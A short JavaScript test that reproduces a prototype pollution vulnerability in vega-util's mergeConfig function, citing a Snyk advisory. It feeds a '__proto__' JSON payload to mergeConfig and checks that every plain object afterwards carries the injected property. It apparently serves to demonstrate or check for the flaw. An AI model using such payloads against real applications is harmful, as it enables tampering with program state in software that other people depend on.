//https://snyk.io/vuln/SNYK-JS-VEGAUTIL-559223

test("prototype pollution in vega-util", () => {
  var util = require("vega-util");
  var config = "{style: {point: {shape: triangle-right}}}";
  var malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  expect({}.polluted).toBe(undefined);

  var c = util.mergeConfig(config, JSON.parse(malicious_payload));

  expect({}.polluted).toBe("yes");
});
